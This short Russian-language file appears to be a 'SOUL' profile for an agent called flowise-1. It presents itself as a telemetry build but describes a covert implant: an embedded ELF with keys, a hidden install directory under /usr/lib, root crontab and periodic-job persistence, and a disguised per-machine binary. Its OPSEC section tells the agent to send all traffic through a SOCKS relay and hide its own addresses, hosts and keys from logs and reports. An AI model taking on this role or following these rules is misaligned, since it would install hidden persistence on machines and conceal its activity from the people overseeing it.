# SOUL: flowise-1@flowise-1

Сборка телеметрии под linux (Alpine Linux 3.x (crond)).
Механизм: embedded ELF (config+keypair+xkey в суффиксе бинаря).
Установка: /usr/lib/.wdcd (персист crond /etc/crontabs/root + /etc/periodic/15min, 
файл /etc/crontabs/root).

Linux по умолчанию несёт собственный C-бинарник (diagd), собираемый
отдельно под каждую машину; Go-носитель в поставке только как карьер.

- build_ver: 1.4.2
- agent_id: flowise-1@flowise-1
- os: linux / Alpine Linux 3.x (crond)
- каталог установки: /usr/lib/.wdcd
- персист: crond /etc/crontabs/root + /etc/periodic/15min

## OPSEC
- Не светить ничего публично: никаких IP/хостов/ключей/конфигов наружу
  (в логах, SOUL.md, именах файлов, в публичных репозиториях).
- Все сетевые операции агента — ТОЛЬКО через SOCKS-релей, никогда напрямую.
- Никаких собственных адресов (IP/hostname) в выводе, отчётах и артефактах.
